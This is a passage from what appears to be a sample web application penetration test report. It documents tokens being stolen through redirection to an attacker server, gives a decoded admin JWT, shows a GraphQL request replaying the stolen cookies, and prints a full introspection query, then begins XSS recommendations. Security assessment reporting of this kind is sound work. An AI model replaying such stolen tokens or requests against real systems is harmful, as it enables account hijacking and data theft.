{"text": "1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Set- Cookie:access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1 MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc 2N1c3MuaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTI0MTk2LCJpYXQiOjE2Mjc1MjIzOTZ9.A19CewVJSjf 4cmSQO23nqCbBjh7j7v4QN4DOn7wFaVTwmyJZMBsb9S4cDSnqpF5Msex_JbvGR2eOX0hGC8acMVZZD svxLYHy7a- npbhQl9iMVWYWl6Z3j36DYXrvVIs4rvNpO45Po7HgiCeDmp6RBT_0CZS8hQCsAYeOXLba2jY; expires=Thu, 29-Jul-2021 02:03:16 GMT; Max-Age=1800; path=/; SameSite=Lax Set- Cookie:id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQ xMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDIiLCJ hdWQiOiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUyNDE5NiwiaWF0IjoxNjI3NTIyMzk2 LCJlbWFpbCI6ImRldittYXJjX3B1cnBsZXNlYy51c0BkaXNjdXNzLmlvIiwiZW1haWxfdmVyaWZpZWQiOnRyd WUsIm5hbWUiOiJNYXJjIFN3aXR6ZXIgVXMiLCJnaXZlbl9uYW1lIjoiTWFyYyBTd2l0emVyIiwiZmFtaWx5X2 5hbWUiOiJVcyIsInpvbmVpbmZvIjoiVVRDIiwiZGlvOnJvbGVzIjpbImFkbWluIl19.Uhhilbc5I8Y2X8uxXKsEgkh Ue3w0_I8iJLaL0mIxARjLXqMLn6EX6sYjw1wOzZd4EWGcWrNhNJba4oLdP_LqqbXSbYY_cGGFIfaYgcZB 7qObPQTx-QvYyp-SoAx5MNoBzgjbyL-7wxc3iw774F-tPakKOKvnNxWqO0j1GQkQ76w; expires=Thu, 29- Jul-2021 02:03:16 GMT; Max-Age=1800; path=/; SameSite=Lax\\nThe application sets both sensitive cookies in the HTTP response parameters then redirects the dev+assessor_purplesec.us@the company user to the attacker-controlled server. The following screenshot shows these cookies being received by the attacker's server: Figure 11 - Cookie Redirect To Attacker's Server The following shows the base64 decoded contents of the id_token excluding the binary signature: {\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"1e9f75eb5e6d6b7151411551a304613aIn0.{\"iss\":\"http:\\/\\/www.the company\",\"sub\":\"3402\",\"aud\":\"the company\",\"nonce\":null,\"exp\":1627524196,\"iat\":1627522396,\"email\":\"dev+assessor_purplesec.us@the company\",\"email_verified\":true,\"name\":\"Assessor\",\"given_name\":\"Assessor \",\"family_name\":\"Us\",\"zoneinfo\":\"UTC\",\"dio:roles\":[\"admin\"]}\\nAfter stealing these sensitive cookies, the attacker can now interact with the application's GraphQL endpoint. Note, the dio session cookie is not stolen from the victim in this attack. The following is a GraqhQL request using these two stolen cookies: POST /dashboard/api/project/graphql HTTP/2 Host: {URL} Cookie: dio=588a409f6514b4ba55471483afe819d1; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxM TU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3M uaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTI0MTk2LCJpYXQiOjE2Mjc1MjIzOTZ9.A19CewVJSjf4cmSQ O23nqCbBjh7j7v4QN4DOn7wFaVTwmyJZMBsb9S4cDSnqpF5Msex_JbvGR2eOX0hGC8acMVZZDsvxLY Hy7a-npbhQl9iMVWYWl6Z3j36DYXrvVIs4rvNpO45Po7HgiCeDmp6RBT_0CZS8hQCsAYeOXLba2jY; id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1 MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDIiLCJhdWQi OiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUyNDE5NiwiaWF0IjoxNjI3NTIyMzk2LCJlb WFpbCI6ImRldittYXJjX3B1cnBsZXNlYy51c0BkaXNjdXNzLmlvIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsI m5hbWUiOiJNYXJjIFN3aXR6ZXIgVXMiLCJnaXZlbl9uYW1lIjoiTWFyYyBTd2l0emVyIiwiZmFtaWx5X25hbW UiOiJVcyIsInpvbmVpbmZvIjoiVVRDIiwiZGlvOnJvbGVzIjpbImFkbWluIl19.Uhhilbc5I8Y2X8uxXKsEgkhUe3w 0_I8iJLaL0mIxARjLXqMLn6EX6sYjw1wOzZd4EWGcWrNhNJba4oLdP_LqqbXSbYY_cGGFIfaYgcZB7qOb PQTx-QvYyp-SoAx5MNoBzgjbyL-7wxc3iw774F-tPakKOKvnNxWqO0j1GQkQ76w; [...] {\"query\":\"query ProjectsAndTeamsQuery($startAmount: Int, $afterCursor: String, $name: String) {\\n viewer {\\n identity\\n id\\n metadata\\n projects(first: $startAmount, after: $afterCursor, name: $name, orderBy: [{field: \\\"createdAt\\\", direction: DESC}]) {\\n pageInfo {\\n startCursor\\n endCursor\\n hasNextPage\\n __typename\\n }\\n totalCount\\n edges {\\n cursor\\n node {\\n data\\n externalId\\n href\\n longitudinalLink\\n isPublic\\n name\\n status\\n createdAt\\n ownerName\\n ownerEmail\\n projectType\\n __typename\\n }\\n __typename\\n }\\n __typename\\n }\\n __typename\\n }\\n}\\n\",\"variables\":{\"startAmount\":10,\"afterCursor\":null,\"name\":\"\"},\"operationName\":\"ProjectsAndTeamsQuer y\"}\\nDate: Thu, 29 Jul 2021 01:38:33 GMT Content-Type: application/json; charset=utf-8 X-Powered-By: Express Vary: Accept-Encoding {\"data\":{\"viewer\":{\"identity\":\"dev+assessor_purplesec.us@the company\",\"id\":\"e1bb4aac-52e1-401e-b0ec- ea5337047b53\",\"metadata\":null,\\nGraphQL Introspection Enabled Severity: Low The application enables GraphQL introspection. This enables users to query the GraphQL server for information about the underlying schema. This includes data like types, fields, queries, mutations, and even field-level descriptions. The following GraqhQL introspection query retrieves all underlying schema information: POST /dashboard/api/project/graphql HTTP/2 Host: app.the company Cookie <snip> Content-Type: application/json Authorization: Bearer Accept: */* Content-Length: 1765 Connection: close {\"query\":\"\\n query IntrospectionQuery {\\n __schema {\\n queryType { name }\\n mutationType { name }\\n subscriptionType { name }\\n types {\\n ...FullType\\n }\\n directives {\\n name\\n description\\n locations\\n args {\\n ...InputValue\\n }\\n }\\n }\\n }\\n\\n fragment FullType on __Type {\\n kind\\n name\\n description\\n fields(includeDeprecated: true) {\\n name\\n description\\n args {\\n ...InputValue\\n }\\n type {\\n ...TypeRef\\n }\\n isDeprecated\\n deprecationReason\\n }\\n inputFields {\\n ...InputValue\\n }\\n interfaces {\\n ...TypeRef\\n }\\n enumValues(includeDeprecated: true) {\\n name\\n description\\n isDeprecated\\n deprecationReason\\n }\\n possibleTypes {\\n ...TypeRef\\n }\\n }\\n\\n fragment InputValue on __InputValue {\\n name\\n description\\n type { ...TypeRef }\\n defaultValue\\n }\\n\\n fragment TypeRef on __Type {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n }\\n }\\n }\\n }\\n }\\n }\\n }\\n }\\n \",\"operationName\":\"IntrospectionQuer\\nDate: Thu, 29 Jul 2021 00:40:48 GMT Content-Type: application/json; charset=utf-8 Content-Length: 52851 X-Powered-By: Express Vary: Accept-Encoding {\"data\":{\"__schema\":{\"queryType\":{\"name\":\"Query\"},\"mutationType\":{\"name\":\"Mutation\"},\"subscriptionType\": null,\"types\":[{\"kind\":\"OBJECT\",\"name\":\"Query\",\"description\":\"\"\\nAppendix A - Findings & Recommendations 1. Stored Cross-Site Scripting An attacker can use Cross-Site-Scripting to insert malicious JavaScript into the application that could then be executed by another user. Consequences of this vulnerability include sensitive account hijacking, stolen credentials, and sensitive data could be exfiltrated. Recommendations: Cross-site scripting vulnerabilities can be remediated by", "metadata": {"doc_id": "Web-Application-Penetration-Test-Sample-Report", "chunk_id": 5}}